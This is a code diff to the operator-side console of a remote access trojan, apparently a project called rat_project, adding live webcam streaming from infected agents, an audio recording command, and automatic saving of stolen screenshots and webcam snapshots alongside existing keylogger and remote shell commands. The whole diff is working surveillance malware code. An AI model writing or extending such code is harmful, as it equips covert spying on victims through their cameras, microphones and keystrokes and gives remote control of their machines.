@@ -6,9 +6,12 @@ Supporte plusieurs agents en parallèle grâce aux threads.
 Interface interactive en ligne de commande pour piloter les agents.
 """
 
+import base64
 import socket
 import threading
 import time
+from datetime import datetime
+from pathlib import Path
 from typing import Any
 
 from rat_project.common.protocol import decode_message, encode_message
@@ -281,6 +284,7 @@ def interact_with_session(session_id: int) -> None:
                 "keylogger",
                 "webcam_snapshot",
                 "webcam_stream",
+                "record_audio",
             ):
                 response = send_command_and_recv(conn, command)
                 _print_response(response)
@@ -291,6 +295,9 @@ def interact_with_session(session_id: int) -> None:
                 duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                 response = send_command_and_recv(conn, "record_audio", {"duration": duration})
                 _save_audio(response)
+            # --- Webcam stream ---
+            elif command == "webcam_stream":
+                _webcam_stream_session(conn, session_id)
 
             # --- Shell interactif ---
             elif command == "shell":
@@ -326,18 +333,23 @@ def interact_with_session(session_id: int) -> None:
 
 
 def _print_response(response: dict[str, Any]) -> None:
-    """Affiche la sortie d'une réponse agent."""
+    """Display the agent's response output."""
     output = response.get("output", "")
     error = response.get("error", "")
     data = response.get("data", None)
+    command = response.get("command", "")
 
     if output:
         print(output)
     if error:
-        print(f"[!] Erreur agent : {error}")
-    if data and not output:
-        # Données binaires encodées en base64 (ex: screenshot)
-        print(f"[*] Données reçues ({len(data)} octets encodés).")
+        print(f"[!] Agent error: {error}")
+    if data and command in ("screenshot", "webcam_snapshot"):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{command}_{timestamp}.jpg"
+        Path(filename).write_bytes(base64.b64decode(data))
+        print(f"[+] Image saved: {filename}")
+    elif data and not output:
+        print(f"[*] Data received ({len(data)} encoded bytes).")
 
 
 def _shell_session(conn: socket.socket, session_id: int) -> None:
@@ -371,6 +383,61 @@ def _shell_session(conn: socket.socket, session_id: int) -> None:
         except KeyboardInterrupt:
             conn.sendall(encode_message({"type": "command", "command": "shell_stop"}))
             break
+
+
+def _webcam_stream_session(conn: socket.socket, session_id: int) -> None:
+    """
+    Receive and display live webcam frames from the agent.
+
+    Sends the webcam_stream command, then loops receiving base64 JPEG frames
+    and displays them with cv2.imshow(). Press 'q' or Ctrl+C to stop.
+
+    Args:
+        conn: TLS socket of the agent.
+        session_id: Session identifier (for logs).
+    """
+    import cv2
+    import numpy as np
+
+    print("[*] Webcam stream started. Press 'q' in the window to stop.")
+    conn.sendall(encode_message({"type": "command", "command": "webcam_stream"}))
+
+    try:
+        while True:
+            data = conn.recv(10 * 1024 * 1024)  # 10 MB max per frame
+            if not data:
+                break
+
+            response = decode_message(data.decode("utf-8").strip())
+
+            if response.get("type") == "stream_error":
+                print(f"[!] Stream error: {response.get('error')}")
+                break
+
+            encoded = response.get("data", "")
+            if not encoded:
+                break
+
+            # Decode base64 → bytes → numpy array → OpenCV frame
+            frame_bytes = base64.b64decode(encoded)
+            frame_array = np.frombuffer(frame_bytes, dtype=np.uint8)
+            frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)
+
+            cv2.imshow("Webcam Stream", frame)
+
+            # 'q' stops the stream
+            if cv2.waitKey(1) & 0xFF == ord("q"):
+                conn.sendall(encode_message({"type": "stream_stop"}))
+                break
+
+    except KeyboardInterrupt:
+        conn.sendall(encode_message({"type": "stream_stop"}))
+        print()
+
+    finally:
+        cv2.destroyAllWindows()
+        logger.info("Webcam stream ended for session %s", session_id)
+        print("[*] Webcam stream stopped.")
 
 
 def _download_file(conn: socket.socket, remote_path: str) -> None:
